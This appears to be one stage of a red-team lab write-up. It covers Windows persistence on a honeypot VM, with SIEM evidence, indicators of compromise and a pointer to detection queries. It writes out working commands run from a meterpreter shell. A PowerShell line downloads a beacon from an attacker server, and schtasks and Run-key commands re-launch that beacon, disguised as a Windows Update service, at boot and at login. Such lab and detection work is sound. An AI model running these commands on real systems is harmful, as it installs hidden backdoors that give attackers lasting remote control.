# Stage 4 — Persistence (T1053.005 + T1547.001)

**Key fact:** `wu_service.exe` is NOT a new file. It is the **same 256,000-byte beacon**
(same SHA256) copied into a native-looking location and renamed:
`C:\ProgramData\WinUpdate\wu_service.exe` (`wu` = "Windows Update" — a classic disguise).

**The planting (all run as SYSTEM, from the meterpreter shell):**
```
# 1. stage the hidden copy (Downloads was wiped by a VM reset, so re-pull from the server)
powershell -nop -c "(New-Object Net.WebClient).DownloadFile('http://192.168.254.100:8080/office_update.exe','C:\ProgramData\WinUpdate\wu_service.exe')"
# 2. fire at BOOT (SYSTEM)
schtasks /create /tn "WinUpdateSvc" /tr "C:\ProgramData\WinUpdate\wu_service.exe" /sc onstart /ru SYSTEM /f
# 3. fire at every LOGIN (backup layer)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdateSvc" /t REG_SZ /d "C:\ProgramData\WinUpdate\wu_service.exe" /f
```

**Why dual:** boot with no login → task fires. Login without the task (killed by an analyst)
→ Run key fires. Two alarm clocks; the defender has to find both.

**Real SIEM proof:**
- `schtasks.exe` pid 22412 (SYSTEM, parent `cmd.exe` 10264) — the `/create` fire
- **TaskCache registry writes** by `svchost.exe` (pid 1252, SYSTEM):
  `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{CC8FE3BC-260C-4084-B110-D0C9C12A02BE}`
  — values `Path=\WinUpdateSvc`, `URI`, `Date`, `Author=WORKGROUP\HONEYPOT$`, `Triggers`, `Actions`
  → the GUID `{CC8FE3BC-260C-4084-B110-D0C9C12A02BE}` is a unique IoC for this task
- `reg.exe` pid 9852 (SYSTEM): `HKLM\...\CurrentVersion\Run :: WinUpdateSvc = C:\ProgramData\WinUpdate\wu_service.exe`

**KQL:** see `../../detections/kql.md` §3.

**Result:** reboot the VM, no one logs in → scheduled task fires `wu_service.exe` → it dials
`:4443` → **a fresh meterpreter session opens with zero human action.** That is the whole
point of the stage, and it's the line that should end the persistence slide.
